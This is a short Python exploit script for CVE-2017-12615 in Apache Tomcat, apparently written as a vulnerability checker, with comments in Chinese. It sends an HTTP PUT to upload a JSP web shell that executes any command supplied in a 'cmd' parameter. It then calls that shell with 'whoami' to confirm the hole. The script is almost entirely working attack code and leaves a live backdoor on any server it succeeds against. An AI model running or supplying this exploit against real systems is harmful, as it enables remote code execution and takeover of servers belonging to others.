#!/usr/bin/env python

import requests
import time

url = 'http://172.30.230.107:8080/'
payload_file = 'shell1.jsp/'

def cve_2017_12615(url):
    payload_url = url + payload_file
    print(payload_url)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'
    }

    payload_body = ("<%java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();"
                    "int a = -1;"
                    "byte[] b = new byte[2048];"
                    "while((a=in.read(b))!=-1){out.println(new String(b));}"
                    "%>")
    #用put把文件写入服务器
    response = requests.put(payload_url, data=payload_body, headers=headers)
    print(payload_url[:-1])
    print(response.status_code)
    #等待一会
    time.sleep(3)
    test_payload = {
        "cmd":"whoami"
    }
    response2 = requests.get(payload_url[:-1], headers=headers,params=test_payload)
    print(response2.status_code)
    if response2.status_code == 200:
        print("漏洞存在！！")
    else:
        print("漏洞不存在！！")

cve_2017_12615(url)